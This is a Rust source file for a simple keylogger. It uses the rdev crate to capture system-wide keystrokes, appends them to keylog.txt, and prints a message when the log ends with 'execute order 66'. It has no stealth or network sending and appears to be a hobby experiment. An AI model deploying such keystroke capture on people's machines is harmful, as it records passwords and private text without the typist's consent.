use rdev::{listen, Event};
use rdev::{simulate, Button, EventType, Key, SimulateError};
use std::{thread, time};

// file writing
use std::fs::File;
use std::fs::OpenOptions;
use std::io::prelude::*;

fn send(event_type: &EventType) {
    let delay = time::Duration::from_millis(20);
    match simulate(event_type) {
        Ok(()) => (),
        Err(SimulateError) => {
            println!("We could not send {:?}", event_type);
        }
    }
    // Let ths OS catchup (at least MacOS)
    thread::sleep(delay);
}

fn char_to_key(c: char) -> Key {
    match c {
        'a' => Key::KeyA,
        'b' => Key::KeyB,
        'c' => Key::KeyC,
        'd' => Key::KeyD,
        'e' => Key::KeyE,
        'f' => Key::KeyF,
        'g' => Key::KeyG,
        'h' => Key::KeyH,
        'i' => Key::KeyI,
        'j' => Key::KeyJ,
        'k' => Key::KeyK,
        'l' => Key::KeyL,
        'm' => Key::KeyM,
        'n' => Key::KeyN,
        'o' => Key::KeyO,
        'p' => Key::KeyP,
        'q' => Key::KeyQ,
        'r' => Key::KeyR,
        's' => Key::KeyS,
        't' => Key::KeyT,
        'u' => Key::KeyU,
        'v' => Key::KeyV,
        'w' => Key::KeyW,
        'x' => Key::KeyX,
        'y' => Key::KeyY,
        'z' => Key::KeyZ,
        ' ' => Key::Space,
        '1' => Key::Num1,
        '2' => Key::Num2,
        '3' => Key::Num3,
        '4' => Key::Num4,
        '5' => Key::Num5,
        '6' => Key::Num6,
        '7' => Key::Num7,
        '8' => Key::Num8,
        '9' => Key::Num9,
        '0' => Key::Num0,
        _ => panic!("Unsupported character"),
    }
}

fn write(s: &str) {
    for c in s.chars() {
        send(&EventType::KeyPress(char_to_key(c)));
        send(&EventType::KeyRelease(char_to_key(c)));
    }
}

fn callback(event: Event) {
    if let Some(string) = event.name {
        // make sure input is a key and not a mouse movement, and extract the char
        if string.len() == 1 {
            let mut fileLocal = OpenOptions::new()
                .write(true)
                .append(true)
                .open("keylog.txt")
                .unwrap();
            // make sure it is a key and not a mouse movement, and that it is only one char
            fileLocal.write_all(string.as_bytes()).unwrap();
        }

        // if user starts to type "execute order 66" then execute a function called order_66
        // get the last 16 characters from the file
        let buffer = std::fs::read_to_string("keylog.txt").unwrap();
        let buffer_len = buffer.len();
        if buffer_len >= 16 {
            let last_16 = &buffer[buffer_len - 16..buffer_len];
            if last_16 == "execute order 66" {
                order_66();
            }
        }
    }
}

fn order_66() {
    println!("Order 66 executed");
}

// struct keylog {
//     file: File,
// }

// impl keylog {
//     fn new() -> keylog {
//         keylog {
//             file: File::create("keylog.txt").unwrap(),
//         }
//     }
//     fn append(&mut self, s: &str) {
//         // appent all the keys to a file
//         self.file.write_all(s.as_bytes()).unwrap();
//     }
//     fn callback(&mut self, event: Event) {
//         println!("My callback {:?}", event);
//         if let Some(string) = event.name {
//             // make sure input is a key and not a mouse movement, and extract the char
//             if string.len() == 1 {
//                 self.append(&string);
//                 println!("{}", string);
//             }
//         }
//     }
// }

fn main() {
    // collect args
    //     let args: Vec<String> = std::env::args().collect();
    //     for arg in args.iter().skip(1) {
    //         write(arg);
    //         // write a space after every word
    //         send(&EventType::KeyPress(Key::Space));
    //         send(&EventType::KeyRelease(Key::Space));
    //     }

    // if keylog.txt already exists, delete it and create a new one
    let _ = std::fs::remove_file("keylog.txt");
    let _ = File::create("keylog.txt");

    let mut file = OpenOptions::new()
        .write(true)
        .append(true)
        .open("keylog.txt")
        .unwrap();

    let string = "hello world";

    for c in string.chars() {
        file.write_all(c.to_string().as_bytes()).unwrap();
    }

    // This will block.
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }
}
